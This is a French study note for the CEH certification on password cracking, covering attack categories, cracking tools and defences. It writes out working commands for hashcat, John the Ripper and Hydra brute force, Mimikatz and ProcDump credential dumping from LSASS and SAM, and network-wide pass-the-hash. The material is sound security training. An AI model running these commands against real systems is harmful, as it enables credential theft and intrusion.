# 🔑 02 — Password Cracking

> **CEH v13 | Module 6** | [← Retour au sommaire](./README.md)

---

## 📖 Définition

Le **password cracking** est le processus de récupération des mots de passe à partir de données stockées ou transmises dans un système informatique, sans l'accord du propriétaire.

---

## 🏗️ Catégories d'attaques par mot de passe

```
┌─────────────────────────────────────────────────────────────────┐
│                  TYPES D'ATTAQUES                               │
├───────────────────┬─────────────────────────────────────────────┤
│  NON-ÉLECTRONIQUE │ Shoulder surfing, Social Engineering,       │
│                   │ Dumpster Diving                              │
├───────────────────┼─────────────────────────────────────────────┤
│  ACTIVE ONLINE    │ Brute Force, Dictionnaire, Hash Injection,  │
│                   │ Phishing, Trojan, Spyware                    │
├───────────────────┼─────────────────────────────────────────────┤
│  PASSIVE ONLINE   │ Sniffing réseau, MITM, Replay Attack         │
├───────────────────┼─────────────────────────────────────────────┤
│  OFFLINE          │ Rainbow Table, Distributed Network Attack    │
└───────────────────┴─────────────────────────────────────────────┘
```

---

## 🔴 Attaques Non-Électroniques

| Technique | Description |
|-----------|-------------|
| **Shoulder Surfing** | Observer physiquement quelqu'un saisir son mot de passe |
| **Social Engineering** | Manipuler psychologiquement pour obtenir des credentials |
| **Dumpster Diving** | Fouiller les poubelles pour trouver des documents avec mots de passe |

---

## 🌐 Attaques Online Actives

### Brute-Force Attack
Essaie **toutes les combinaisons possibles** de caractères jusqu'à trouver le bon mot de passe.

```
Caractères testés : a, b, c... aa, ab, ac... aaa...
Avantage : Garantit de trouver le mot de passe
Inconvénient : Très lent — exponentiel en longueur
```

### Dictionary Attack
Utilise une **liste prédéfinie** de mots de passe courants.

```
Fichier wordlist : rockyou.txt (14M mots), weakpass, crackstation
Avantage : Très rapide pour les mots de passe courants
Inconvénient : Inefficace contre des mots de passe complexes
```

```bash
# Étapes d'une attaque par dictionnaire manuelle :
# 1. Trouver un utilisateur valide
# 2. Créer une liste de mots de passe probables
# 3. Classer par probabilité
# 4. Tester chaque mot de passe
```

### Rule-Based Attack (Hybrid)
Combine dictionnaire + règles de mutation :
```
password → P@ssw0rd, password123, PASSWORD!, Pass1234
```

---

## 🟡 Attaques Online Passives

### Sniffing / MITM
Capture le trafic réseau pour intercepter les hash NTLM ou credentials en clair.

```
Client ──── [Attaquant intercepte] ──── Serveur
       └─── Hash NTLMv2 capturé ──┘
```

**Outils** : Wireshark, Responder, bettercap

### Replay Attack
Rejoue un hash capturé sans le déchiffrer pour s'authentifier.

---

## ⚫ Attaques Offline

### Rainbow Table Attack
Utilise des **tables de hash précalculées** pour inverser les hash en clair.

```
Création :    mot_de_passe → hash(SHA1/MD5/NTLM) → stocké en table
Attaque  :    hash_cible → recherche dans la table → mot_de_passe
```

| Avantage | Inconvénient |
|----------|--------------|
| Extrêmement rapide | Fichiers énormes (GB) |
| Fonctionne sur LM/NTLM | Inefficace si salt utilisé |

> 🔑 **Contremesure** : Le **salting** (ajout d'un sel aléatoire avant le hash) rend les rainbow tables inutilisables.

### Distributed Network Attack (DNA)
Utilise la puissance de calcul de **machines distribuées** (ordinateurs du monde entier) pour craquer les mots de passe.

---

## 🔧 Outils de Password Cracking

### Hashcat
> Outil de référence — exploite le **GPU** (100x plus rapide que CPU)

```bash
# NTLM — Attaque dictionnaire
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# NTLM — Brute-force (8 caractères quelconques)
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# MD5 — Brute-force (8 caractères)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# SHA-1
hashcat -m 100 -a 0 hashes.txt rockyou.txt

# Linux SHA-512 (shadow) — Hybrid
hashcat -m 1800 -a 6 hashes.txt rockyou.txt ?d?d?d?d

# Modes importants hashcat
# -m 0    = MD5
# -m 100  = SHA-1
# -m 1000 = NTLM
# -m 1800 = SHA-512 (Linux shadow)
# -m 13100 = Kerberoast (TGS-REP)

# Types d'attaque (-a)
# -a 0 = Dictionnaire
# -a 1 = Combinaison
# -a 3 = Brute-force / Mask
# -a 6 = Hybrid (wordlist + mask)
```

---

### John the Ripper
> Excellent pour les attaques basées sur des règles (CPU)

```bash
# Cracker un hash NTLM
john --wordlist=rockyou.txt --format=NT hashes.txt

# Avec règles de mutation
john --wordlist=rockyou.txt --rules hashes.txt

# Afficher les mots de passe trouvés
john --show hashes.txt

# Casser les hash Linux /etc/shadow
john --wordlist=rockyou.txt shadow.txt
```

---

### Ophcrack
> Spécialisé dans les **rainbow tables LM/NTLM** de Windows

- Utilise des tables précompilées pour craquer instantanément les mots de passe LM
- Interface graphique disponible
- Tables gratuites disponibles pour mots de passe courants (< 14 chars alphanumériques)

---

### L0phtCrack (LC7)
- Outil commercial de cracking Windows
- Supporte : dictionnaire, brute-force, hybrid, rainbow tables
- Import de hash depuis SAM, NTDS.dit, Active Directory

---

### Hydra (THC-Hydra)
> Outil de brute-force **en ligne** (authentification réseau)

```bash
# SSH brute-force
hydra -l admin -P rockyou.txt ssh://192.168.1.1

# HTTP POST brute-force
hydra -L users.txt -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# RDP brute-force
hydra -l administrator -P rockyou.txt rdp://192.168.1.1

# SMB brute-force
hydra -l admin -P rockyou.txt smb://192.168.1.1
```

---

## 🔍 Extraction des Hash Windows

### Depuis LSASS (mémoire) — Mimikatz

```
mimikatz.exe
mimikatz # privilege::debug          ← Obtenir les droits debug
mimikatz # token::elevate            ← Élever en SYSTEM
mimikatz # sekurlsa::logonpasswords  ← Dump toutes les credentials
mimikatz # sekurlsa::msv             ← Dump uniquement les hash NTLM
mimikatz # lsadump::sam              ← Dump la base SAM
```

**Sortie exemple :**
```
Authentication Id : 0 ; 302247 (00000000:00049ca7)
Session : RemoteInteractive from 2
User Name : Administrator
Domain   : CORP
Logon Server : DC1
msv :
  [00000003] Primary
  * Username : Administrator
  * Domain   : CORP
  * NTLM     : fc525c9683e8fe067095ba2ddc971889
  * SHA1     : d31eb9a2d1fb54a2fa0f77a92b4e97e0b8e3ed07
```

---

### Depuis SAM — PwDump7 / secretsdump

```bash
# PwDump7 (local)
pwdump7.exe

# secretsdump.py (Impacket) — local ou distant
python3 secretsdump.py -sam sam.save -system system.save LOCAL
python3 secretsdump.py DOMAIN/Admin:Password@192.168.1.1
```

### Dump mémoire LSASS — ProcDump

```bash
# Créer un dump de LSASS
procdump.exe -ma lsass.exe lsass.dmp

# Ou via PowerShell (admin requis)
$lsassPID = (Get-Process lsass).Id
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $lsassPID C:\lsass.dmp full
```

---

## 🔁 Pass-the-Hash (PtH)

> Utilise le **hash NTLM directement** pour s'authentifier **sans connaître le mot de passe en clair**

```
Hash NTLM obtenu
      ↓
Mimikatz sekurlsa::pth → Nouveau processus avec le contexte
      ↓
Accès aux ressources réseau autorisées par ce compte
```

```bash
# Mimikatz — Pass-the-Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:cmd.exe

# CrackMapExec — PtH sur tout un réseau
crackmapexec smb 192.168.1.0/24 -u Administrator -H fc525c9683e8fe067095ba2ddc971889

# psexec.py (Impacket) — PtH
python3 psexec.py -hashes :fc525c9683e8fe067095ba2ddc971889 Administrator@192.168.1.10
```

**Fonctionnement :**
```
Client                          Serveur
  │                               │
  ├─1─► Username ────────────────►│
  │◄─2─ Challenge (8 bytes) ──────┤
  ├─3─► Response (hash NTLM       │
  │      × Challenge) ───────────►│  ← Hash utilisé directement
  │◄─4─ Access Granted ───────────┤
```

---

## 🏳️ Défense contre le Password Cracking

| Mesure | Description |
|--------|-------------|
| **Mots de passe longs et complexes** | Minimum 12-14 caractères, mixte |
| **Salting** | Ajouter un sel aléatoire avant le hash |
| **bcrypt/Argon2** | Algorithmes de hash lents par conception |
| **MFA** | Authentification multifacteurs |
| **Account lockout** | Verrouiller après N tentatives échouées |
| **Désactiver LM hash** | Via GPO ou registre Windows |
| **LAPS** | Local Administrator Password Solution |
| **Credential Guard** | Protection de LSASS via virtualisation (Windows 10+) |
| **Monitorer les Event IDs** | 4625 (échec auth), 4771 (Kerberos), 4624 (succès) |

---

[← Introduction](./01-introduction-methodology.md) | [→ Exploitation de vulnérabilités](./03-vulnerability-exploitation.md)
